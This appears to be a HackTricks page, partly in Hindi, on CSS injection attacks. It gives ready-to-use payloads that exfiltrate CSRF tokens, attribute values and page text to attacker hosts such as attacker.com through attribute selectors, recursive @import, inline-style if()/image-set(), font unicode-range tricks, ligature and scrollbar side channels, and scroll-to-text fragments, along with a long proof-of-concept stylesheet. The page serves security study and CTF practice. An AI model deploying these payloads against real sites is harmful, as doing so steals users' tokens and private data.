# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### एट्रिब्यूट सेलेक्टर

CSS सेलेक्टर्स को इस तरह बनाया जाता है कि वे `input` एलिमेंट के `name` और `value` एट्रिब्यूट के मानों से मिलें। यदि `input` एलिमेंट के `value` एट्रिब्यूट की शुरुआत किसी विशिष्ट कैरैक्टर से होती है, तो एक पूर्वनिर्धारित बाहरी संसाधन लोड हो जाता है:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
हालाँकि, यह तरीका छिपे हुए input elements (`type="hidden"`) के साथ काम करते समय एक सीमा का सामना करता है क्योंकि छिपे हुए एलिमेंट्स बैकग्राउंड लोड नहीं करते।

#### छिपे हुए एलिमेंट्स के लिए बायपास

इस सीमा को बायपास करने के लिए, आप `~` general sibling combinator का उपयोग करके उसके बाद आने वाले sibling element को target कर सकते हैं। फिर CSS rule hidden input element के बाद आने वाले सभी siblings पर लागू हो जाता है, जिससे background image लोड हो जाती है:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### CSS Injection के लिए पूर्व-आवश्यकताएँ

For the CSS Injection technique to be effective, certain conditions must be met:

1. **Payload Length**: CSS injection vector को crafted selectors समाहित करने के लिए पर्याप्त लंबे payloads का समर्थन करना चाहिए।
2. **CSS Re-evaluation**: आपके पास पेज को frame करने की क्षमता होनी चाहिए, जो नए जनरेट किए गए payloads के साथ CSS की re-evaluation को trigger करने के लिए आवश्यक है।
3. **External Resources**: यह technique externally hosted images का उपयोग करने की क्षमता मानती है। यह साइट की Content Security Policy (CSP) द्वारा प्रतिबंधित हो सकता है।

### Blind Attribute Selector

As [**इस पोस्ट में समझाया गया है**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **CSS injection का उपयोग करके blind pages से जानकारी** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

पिछली तकनीक में कुछ कमियाँ हैं — पूर्वापेक्षाएँ देखें। आपको या तो **victim को कई लिंक भेजने में सक्षम होना चाहिए**, या आपको **CSS injection vulnerable page को iframe करने में सक्षम होना चाहिए**।

हालाँकि, एक और चालाक तकनीक है जो तकनीक की गुणवत्ता सुधारने के लिए **CSS `@import`** का उपयोग करती है।

इसे सबसे पहले [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) ने दिखाया था और यह इस तरह काम करता है:

एक ही पेज को बार-बार, हर बार दर्जनों अलग payloads के साथ लोड करने के बजाय (जैसा कि पिछली तकनीक में), हम पेज को **सिर्फ एक बार लोड करेंगे और सिर्फ एक import के साथ attackers server की ओर इशारा करेंगे** (यह payload है जिसे victim को भेजना है):
```css
@import url("//attacker.com:5001/start?");
```
1. Import attackers से **कुछ CSS script प्राप्त करेगा** और **browser इसे load करेगा**.
2. Attacker द्वारा भेजा जाने वाला CSS script का पहला भाग **फिर से attackers के server पर एक और `@import` होगा.**
1. attackers server अभी इस request का response नहीं देगा, क्योंकि हम कुछ chars को leak करना चाहते हैं और फिर अगले ones को leak करने के लिए इस import का payload से response करेंगे.
3. Payload का दूसरा और बड़ा हिस्सा **attribute selector leakage payload** होगा
1. यह attackers के server को secret का **पहला char और आखिरी char** भेजेगा
4. जब attackers server को secret के **पहले और आखिरी char** मिल जाएंगे, तो यह **step 2 में मांगी गई import का response देगा**.
1. Response बिल्कुल वही होगा जैसा कि **steps 2, 3 and 4**, लेकिन इस बार यह secret के **दूसरे char और फिर उप-आखिरी** को खोजने की कोशिश करेगा.

Attacker उस loop को **follow करेगा जब तक वह secret को पूरी तरह से leak करने में सफल न हो जाए**.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> स्क्रिप्ट हर बार 2 chars (शुरू से और अंत से) खोजने की कोशिश करेगी क्योंकि attribute selector इस तरह की चीज़ें करने की अनुमति देता है:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> इससे स्क्रिप्ट secret को तेजी से leak कर पाएगी।

> [!WARNING]
> कभी-कभी स्क्रिप्ट **यह सही तरीके से detect नहीं करती कि पाया गया prefix + suffix पहले से ही पूरा flag है** और यह आगे (prefix में) और पीछे (suffix में) बढ़ती रहेगी और किसी बिंदु पर hang कर जाएगी.\
> चिंता की बात नहीं, बस **output** चेक करें क्योंकि **आप वहां flag देख सकते हैं**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. यह CSS custom properties, attr() function (same-element attributes पढ़ने के लिए), नए CSS if() conditionals (branching के लिए), और image-set() (match किए गए value को encode करने वाला network request trigger करने के लिए) पर निर्भर करता है।

> [!WARNING]
> if() में equality comparisons के लिए string literals में double quotes की आवश्यकता होती है। Single quotes match नहीं करेंगे।

- Sink: किसी element के style attribute को control करें और सुनिश्चित करें कि target attribute उसी element पर हो (attr() केवल same-element attributes पढ़ता है)।
- Read: attribute की value को CSS variable में copy करें: `--val: attr(title)`.
- Decide: nested conditionals का उपयोग करके variable की तुलना string candidates से कर URL चुनें: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: चुने गए endpoint के लिए request मजबूर करने के लिए `background: image-set(var(--steal))` (या कोई भी fetching property) लागू करें।

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
कार्यशील payload (तुलना में double quotes आवश्यक हैं):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
नेस्टेड कंडीशनों के साथ attribute मानों की सूची बनाना:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
यथार्थवादी डेमो (probing usernames):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
नोट्स और सीमाएँ:

- अनुसंधान के समय Chromium-based ब्राउज़रों पर काम करता है; अन्य इंजन पर व्यवहार अलग हो सकता है।
- यह सीमित/गणनीय मान क्षेत्रों (IDs, flags, छोटे usernames) के लिए सबसे उपयुक्त है। बाहरी stylesheets के बिना arbitrary लंबी स्ट्रिंग्स चुराना चुनौतीपूर्ण बना रहता है।
- कोई भी CSS property जो URL को fetch करती है, उसे request ट्रिगर करने के लिए उपयोग किया जा सकता है (उदा., background/image-set, border-image, list-style, cursor, content).

Automation: a Burp Custom Action nested inline-style payloads जनरेट करके attribute values को brute-force करने के लिए उपयोग कर सकता है: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Other selectors

DOM के हिस्सों तक पहुँचने के अन्य तरीके **CSS selectors** का उपयोग कर:

- **`.class-to-search:nth-child(2)`**: यह DOM में class "class-to-search" वाला दूसरा आइटम खोजेगा।
- **`:empty`** selector: उदाहरण के लिए [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

सामान्य उद्देश्य यह है कि **नियंत्रित endpoint से एक custom font का उपयोग किया जाए** और यह सुनिश्चित किया जाए कि **text (इस मामले में, 'A') केवल तभी इस font के साथ दर्शाया जाए जब निर्दिष्ट resource (`favicon.ico`) लोड न हो सके**।
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **कस्टम फ़ॉन्ट का उपयोग**:

- एक कस्टम फ़ॉन्ट `<head>` सेक्शन के `<style>` टैग के अंदर `@font-face` नियम का उपयोग करके परिभाषित किया गया है।
- फ़ॉन्ट का नाम `poc` रखा गया है और इसे एक external endpoint (`http://attacker.com/?leak`) से फ़ेच किया जाता है।
- `unicode-range` प्रॉपर्टी को `U+0041` पर सेट किया गया है, जो विशिष्ट यूनिकोड कैरेक्टर 'A' को लक्षित करता है।

2. **Object Element with Fallback Text**:
- `<body>` सेक्शन में `id="poc0"` वाले `<object>` एलिमेंट को बनाया गया है। यह एलिमेंट `http://192.168.0.1/favicon.ico` से एक resource लोड करने की कोशिश करता है।
- इस एलिमेंट के लिए `font-family` को `<style>` सेक्शन में परिभाषित `'poc'` पर सेट किया गया है।
- यदि resource (`favicon.ico`) लोड करने में विफल रहता है, तो `<object>` टैग के अंदर fallback content (अक्षर 'A') प्रदर्शित होता है।
- यदि external resource लोड नहीं हो पाता, तो fallback content ('A') कस्टम फ़ॉन्ट `poc` का उपयोग करके render होगा।

### Styling Scroll-to-Text Fragment

**`:target`** pseudo-class का उपयोग उस तत्व को select करने के लिए किया जाता है जिसे **URL fragment** द्वारा target किया गया हो, जैसा कि [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo) में निर्दिष्ट है। यह समझना महत्वपूर्ण है कि `::target-text` किसी भी तत्व से मेल नहीं खाता जब तक कि टेक्स्ट को fragment द्वारा स्पष्ट रूप से target न किया गया हो।

जब हमलावर **Scroll-to-text** fragment feature का दुरुपयोग करते हैं, तो एक सुरक्षा चिंता उत्पन्न होती है — इससे वे HTML injection के ज़रिये अपने server से resource लोड करके किसी वेबपेज पर किसी विशेष टेक्स्ट की उपस्थिति की पुष्टि कर सकते हैं। यह तरीका इस तरह की CSS rule inject करने में शामिल है:
```css
:target::before {
content: url(target.png);
}
```
ऐसे परिदृश्यों में, यदि पेज पर "Administrator" मौजूद है, तो सर्वर से `target.png` रिसोर्स का अनुरोध होता है, जो टेक्स्ट की मौजूदगी दर्शाता है। इस attack का एक उदाहरण एक विशेष रूप से तैयार किए गए URL के माध्यम से निष्पादित किया जा सकता है जो injected CSS को Scroll-to-text fragment के साथ एम्बेड करता है:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
यहाँ, हमला HTML injection को manipulate करके CSS कोड को भेजता है, Scroll-to-text fragment (`#:~:text=Administrator`) के माध्यम से विशेष टेक्स्ट "Administrator" को लक्षित करते हुए। यदि वह टेक्स्ट मिल जाता है, तो निर्दिष्ट resource लोड हो जाता है, जो अनजाने में उसकी मौजूदगी का संकेत attacker को दे देता है।

रोकथाम के लिए, निम्न बिंदुओं पर ध्यान देना चाहिए:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) केवल शब्दों या वाक्यों से मेल खाने के लिए डिज़ाइन किया गया है, इसलिए इसकी क्षमता arbitrary secrets या tokens को leak करने तक सीमित रहती है।
2. **Restriction to Top-level Browsing Contexts**: STTF केवल top-level browsing contexts में ही काम करता है और iframes के भीतर कार्य नहीं करता, जिससे किसी भी exploitation प्रयास का उपयोगकर्ता के लिए पता लगना अधिक संभव होता है।
3. **Necessity of User Activation**: STTF को कार्य करने के लिए user-activation gesture की आवश्यकता होती है, यानी exploitations केवल user-initiated navigations के माध्यम से संभव होते हैं। यह आवश्यकता बिना user interaction के attacks के automated होने के जोखिम को काफी हद तक कम करती है। फिर भी, blog post के लेखक ने कुछ विशेष परिस्थितियों और bypasses (जैसे social engineering, लोकप्रिय browser extensions के साथ interaction) की ओर इशारा किया है जो attack के automation को आसान बना सकते हैं।

इन механизмों और संभावित कमजोरियों के प्रति सजग रहना वेब सुरक्षा बनाए रखने और ऐसे exploitative तरीकों से बचाव के लिए महत्वपूर्ण है।

For more information check the original report: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

You can check an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

आप specific unicode मानों के लिए **external fonts** निर्दिष्ट कर सकते हैं जो केवल तभी **gathered होंगे यदि वे unicode मान पेज में मौजूद हों**। उदाहरण के लिए:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
जब आप इस पेज को एक्सेस करते हैं, तो Chrome और Firefox "?A" और "?B" को fetch करते हैं क्योंकि sensitive-information के text node में "A" और "B" कैरेक्टर मौजूद हैं। लेकिन Chrome और Firefox "?C" को fetch नहीं करते क्योंकि इसमें "C" मौजूद नहीं है। इसका मतलब है कि हम "A" और "B" को पढ़ने में सक्षम रहे हैं।

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**संदर्भ:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

यह तकनीक font ligatures का लाभ उठाकर और width में होने वाले परिवर्तनों को मॉनिटर करके किसी node से टेक्स्ट निकालने (extract) के बारे में बताती है। प्रक्रिया में कई चरण शामिल हैं:

1. **Creation of Custom Fonts**:

- SVG fonts ऐसे glyphs के साथ बनाए जाते हैं जिनमें `horiz-adv-x` attribute होता है, जो दो-चरैक्टर sequence का प्रतिनिधित्व करने वाले glyph के लिए बड़ी width सेट करता है।
- उदाहरण SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, जहाँ "XY" दो-चरैक्टर sequence दर्शाता है।
- इन fonts को बाद में fontforge का उपयोग करके woff format में convert किया जाता है।

2. **Detection of Width Changes**:

- CSS का उपयोग यह सुनिश्चित करने के लिए किया जाता है कि टेक्स्ट wrap न हो (`white-space: nowrap`) और scrollbar style को customize किया जा सके।
- एक अलग style वाला horizontal scrollbar दिखाई देने पर यह संकेत (indicator / oracle) देता है कि एक specific ligature, और इसलिए एक specific character sequence, टेक्स्ट में मौजूद है।
- शामिल CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: बड़े width वाले character जोड़ों के लिए fonts बनाए जाते हैं।
- **Step 2**: यह पता लगाने के लिए scrollbar-based trick का उपयोग किया जाता है कि कब बड़ा width glyph (किसी character pair का ligature) render हो रहा है, जो character sequence की उपस्थिति को दर्शाता है।
- **Step 3**: एक ligature का पता चलने पर, तीन-चरैक्टर sequences का प्रतिनिधित्व करने वाले नए glyphs बनाए जाते हैं, जिनमें पाए गए pair को शामिल करके उसके आगे या पीछे एक अतिरिक्त character जोड़ा जाता है।
- **Step 4**: तीन-चरैक्टर ligature की detection की जाती है।
- **Step 5**: यह प्रक्रिया दोहराई जाती है, और धीरे-धीरे पूरा टेक्स्ट उजागर होता है।

4. **Optimization**:
- वर्तमान initialization method में `<meta refresh=...` का उपयोग किया गया है जो optimal नहीं है।
- एक अधिक प्रभावी तरीका CSS `@import` trick का उपयोग करना हो सकता है, जिससे exploit का प्रदर्शन सुधर सकता है।

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**संदर्भ:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

यह trick इस [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/) में जारी किया गया था। किसी text node में प्रयुक्त charset को ब्राउज़र में pre-installed default fonts का उपयोग करके leak किया जा सकता है: किसी external या custom font की आवश्यकता नहीं है।

इस विचार का केंद्र एक animation का उपयोग करके एक `div` की width को क्रमिक रूप से बढ़ाना है, जिससे एक-एक कर के कैरेक्टर 'suffix' भाग से 'prefix' भाग में ट्रांज़िशन कर सकें। यह प्रक्रिया टेक्स्ट को प्रभावी रूप से दो हिस्सों में बाँट देती है:

1. Prefix: प्रारम्भिक लाइन।
2. Suffix: बाद की लाइन(या लाइन्स)।

कैरैक्टर के ट्रांज़िशन के चरण कुछ इस तरह दिखाई देंगे:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

इस ट्रांज़िशन के दौरान, unicode-range trick का उपयोग प्रत्येक नए कैरेक्टर की पहचान करने के लिए किया जाता है जब वह prefix में जुड़ता है। यह Comic Sans पर स्विच करके किया जाता है, जो default font से अधिक ऊँची है, और परिणामस्वरूप एक vertical scrollbar ट्रिगर होता है। इस scrollbar के दिखाई देने से अप्रत्यक्ष रूप से यह पता चलता है कि prefix में एक नया कैरेक्टर आया है।

हालाँकि यह तरीका अलग-अलग unique characters का पता लगाने की अनुमति देता है जब वे दिखते हैं, यह यह निर्दिष्ट नहीं करता कि कौनसा character repeat हुआ है—सिर्फ यह बताता है कि repetition हुआ है।

> [!TIP]
> मूल रूप से, the **unicode-range is used to detect a char**, लेकिन चूँकि हम external font लोड नहीं करना चाहते, हमें दूसरा तरीका ढूँढना होगा।\
> जब **char** **found** होता है, तो उसे pre-installed **Comic Sans font** दे दिया जाता है, जो **char** को बड़ा कर देता है और **scroll bar** को **trigger** करता है जो पाए गए **char** को **leak** कर देगा।

PoC से निकाला गया code देखें:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

यह मामला पिछले वाले के बहुत समान है, हालांकि इस मामले में उद्देश्य कुछ विशिष्ट **chars bigger than other is to hide something** — जैसे कि ऐसा बटन जिसे bot दबाए नहीं या कोई image जो लोड न हो — छिपाना है। इसलिए हम उस क्रिया (या क्रिया की कमी) को मापकर जान सकते हैं कि क्या कोई विशिष्ट char टेक्स्ट के भीतर मौजूद है।

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

इस मामले में, हम यह पता लगाने की कोशिश कर सकते हैं कि क्या कोई char टेक्स्ट में मौजूद है, वही origin से एक fake font लोड करके:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
यदि मैच होता है, तो **फ़ॉन्ट `/static/bootstrap.min.css?q=1` से लोड होगा**। हालांकि यह सफलतापूर्वक लोड नहीं होगा, फिर भी **ब्राउज़र इसे cache कर लेना चाहिए**, और अगर cache न भी हो तो **304 not modified** मेकैनिज़्म है, इसलिए **response अन्य चीज़ों की तुलना में तेज़ होना चाहिए**।

हालाँकि, अगर cached और non-cached response के बीच समय का अंतर काफी बड़ा नहीं है, तो यह उपयोगी नहीं होगा। उदाहरण के लिए, लेखक ने उल्लेख किया: "However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the `disk-cache-size=1` flag, which is really thoughtful."

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** यह [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) में उल्लेखित है

इस मामले में आप संकेत कर सकते हैं कि **CSS से एक ही origin से सैकड़ों fake fonts लोड किए जाएँ** जब मैच होता है। इस तरह आप **उसमें लगने वाला समय माप** सकते हैं और पता लगा सकते हैं कि कोई अक्षर प्रकट होता है या नहीं, कुछ इस तरह:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
और bot’s code इस तरह दिखता है:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
तो, यदि फ़ॉन्ट मेल नहीं खाता है, तो बॉट पर विज़िट करने पर प्रतिक्रिया समय लगभग 30 सेकंड अनुमानित है। हालांकि, यदि फ़ॉन्ट मेल खाता है, तो फ़ॉन्ट प्राप्त करने के लिए कई अनुरोध भेजे जाएंगे, जिससे नेटवर्क पर लगातार गतिविधि होगी। परिणामस्वरूप, stop condition को संतुष्ट करने और प्रतिक्रिया प्राप्त करने में अधिक समय लगेगा। इसलिए, यह निर्धारित करने के लिए कि फ़ॉन्ट मेल खाता है या नहीं, प्रतिक्रिया समय को एक संकेतक के रूप में उपयोग किया जा सकता है।

## संदर्भ

